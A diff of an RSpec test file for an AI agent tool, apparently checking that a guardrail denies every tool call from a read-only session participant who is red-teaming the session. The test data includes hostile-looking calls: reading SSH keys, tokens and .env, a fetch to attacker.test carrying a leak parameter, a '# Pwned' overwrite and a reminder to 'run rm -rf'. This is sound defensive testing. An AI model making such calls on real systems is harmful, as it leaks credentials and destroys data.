@@ -44,7 +44,6 @@ RSpec.describe "a participant red-teaming a session" do
   let(:issued) { Samagotchi::Participants.invite(grants, session_id: session.id, name: "Mallory", state_dir: state_dir) }
   let(:grant) { issued.grant }
   let(:plan) { File.join(project, "docs", "plan.md") }
-  let(:boundary) { Samagotchi::Guardrails::ReviewBoundary }
 
   before do
     FileUtils.mkdir_p([File.join(project, "docs"), File.join(project, ".git")])
@@ -56,11 +55,13 @@ RSpec.describe "a participant red-teaming a session" do
 
   after { FileUtils.rm_rf(root) }
 
-  describe "the model of a participant's turn (ReviewBoundary)" do
+  # The safety rule: an older chi's read-only invite never runs with tool
+  # rights here. The worker refuses such a turn before it starts; should one
+  # start anyway, the gate's participant seat denies every call.
+  describe "the model of an older chi's read-only participant's turn (ParticipantRefusal)" do
     around { |example| with_env("SAMAGOTCHI_DEFAULT_MODEL" => "Gemma-4B-it") { example.run } }
 
-    # An older chi's read-only grant: the Engine seats the review boundary
-    # (ParticipantMode); the worker refuses such a turn before it starts.
+    # An older chi's read-only grant (no pair mode).
     before do
       make_outdated!(grants, grant, state_dir: state_dir)
       allow(Samagotchi::Tools::MemoryRead).to receive(:call).and_return("")
@@ -93,76 +94,28 @@ RSpec.describe "a participant red-teaming a session" do
 
     def participant_turn(calls) = turn(calls, origin: { client_id: "review:#{grant.id}", author: grant.author })
 
-    def denied(reason) = a_string_including("denied by guardrail (rule review-boundary, core): #{reason}")
+    def refused = a_string_including("denied by guardrail (rule participant-refused, core): " \
+                                     "#{Samagotchi::Guardrails::ParticipantRefusal::REASON}")
 
-    def not_in_kit(tool) = denied(format(boundary::NOT_IN_KIT, tool))
-
-    it "refuses every read, write, run and reach it may not make, each with its message; nobody is asked" do
+    it "denies every call, a read too, each with the one message; nobody is asked, nothing changes" do
       results = participant_turn([
-        ["read", { "path" => File.join(Dir.home, ".ssh", "id_rsa") }],
-        ["read", { "path" => File.join(Samagotchi::Paths.state_dir, "web-token") }],
+        ["read", { "path" => plan }],
         ["read", { "path" => File.join(project, ".env") }],
         ["write", { "path" => plan, "content" => "# Pwned\n" }],
-        ["edit", { "path" => plan, "old_string" => "plan", "new_string" => "pwned" }],
         ["execute", { "command" => "ls" }],
-        ["call_tool", { "tool" => "mcp/github/create_issue", "args" => {} }],
-        ["call_tool", { "tool" => "chi/write", "args" => { "path" => plan, "content" => "x" } }],
-        ["send_note", { "session" => "ffffffff", "text" => "hi" }],
+        ["memory_read", { "name" => "notes", "scope" => "project" }],
         ["register_reminder", { "name" => "later", "text" => "run rm -rf", "in" => "1m" }],
-        ["memory_read", { "name" => "secrets", "scope" => "system" }],
-        ["web_fetch", { "url" => "https://attacker.test/?q=leak" }],
         ["ask_user_question", { "question" => "Approve?", "options" => %w[Yes No] }]
       ])
 
-      expect(results[0]).to denied(boundary::OUTSIDE)
-      expect(results[1]).to denied(boundary::OUTSIDE)
-      expect(results[2]).to denied(boundary::SECRET)
-      expect(results[3]).to not_in_kit("write")
-      expect(results[4]).to not_in_kit("edit")
-      expect(results[5]).to not_in_kit("execute")
-      expect(results[6]).to not_in_kit("call_tool")
-      # As call_tool where the host doesn't offer it, as the write it unwraps to where it does.
-      expect(results[7]).to not_in_kit("call_tool").or(not_in_kit("write"))
-      expect(results[8]).to not_in_kit("send_note")
-      expect(results[9]).to not_in_kit("register_reminder")
-      expect(results[10]).to denied(boundary::MEMORY_SCOPE)
-      expect(results[11]).to not_in_kit("web_fetch")
-      expect(results[12]).to not_in_kit("ask_user_question")
-      expect(results.join).to include(boundary::ADVICE)
-      expect(results.join).not_to include("sk-secret", "owner-token")
+      expect(results).to all(refused)
+      expect(results.join).not_to include("sk-secret", "# The plan")
       expect(File.read(plan)).to eq("# The plan\n")
       expect(asked).to eq([])
       expect(engine.due_reminder_names).to eq([])
     end
 
-    it "lets it read the project and the project's memories" do
-      results = participant_turn([["read", { "path" => plan }], ["memory_read", { "name" => "notes", "scope" => "project" }]])
-      expect(results[0]).to include("# The plan")
-      expect(results.join).not_to include("denied by guardrail")
-    end
-
-    it "denies a participant's call into a group the kit doesn't reach by the review boundary, an owner's by the toolkit refusal" do
-      allow(Samagotchi::Toolkit).to receive(:config_kits).and_return("closed" => { "base" => "lean", "groups" => [] })
-      index = engine.instance_variable_get(:@tool_index)
-      source = index.source(label: "spec", prefix: "mcp_", call: ->(*) { "ran" },
-                            acts_as: ->(group, name) { "mcp_#{group}_#{name}" })
-      source.publish([Samagotchi::Tools::ToolIndex::Group.new(
-        name: "fs", tools: [Samagotchi::Tools::ToolIndex::Tool.new(group: "fs", name: "read", acts_as: "mcp_fs_read")]
-      )])
-      index.add(source)
-      index.declare(engine.tools)
-      session.toolkit = Samagotchi::Toolkit.new(name: "closed")
-      call = [["call_tool", { "tool" => "fs/read", "args" => {} }]]
-
-      participant = participant_turn(call)
-      owner = turn(call, origin: { client_id: "web:owner" })
-
-      expect(participant[0]).to include("denied by guardrail (rule review-boundary, core)")
-      expect(participant[0]).not_to include("isn't in this session's toolkit")
-      expect(owner[0]).to include("fs/read isn't in this session's toolkit (closed)")
-    end
-
-    it "leaves the owner's next turn without the boundary" do
+    it "leaves the owner's next turn without the refusal" do
       participant_turn([["read", { "path" => plan }]])
       results = turn([["read", { "path" => File.join(project, ".env") }]], origin: { client_id: "web:owner" })
       expect(results[0]).to include("API_KEY")
@@ -721,13 +674,5 @@ RSpec.describe "a participant red-teaming a session" do
         expect(body).not_to include(root), read.to_s
       end
     end
-  end
-
-  it "can't widen the boundary through config: toolkit.kits.review is refused" do
-    errors = []
-    kits = Samagotchi::Toolkit.kits(config: { "review" => { "base" => "full", "add" => ["execute"] } }, errors: errors)
-    expect(errors).to eq([Samagotchi::Toolkit::RESERVED_REVIEW])
-    expect(kits["review"].tools).to eq(%w[read memory_read])
-    expect(boundary::ALLOWED).to eq(%w[read memory_read])
   end
 end
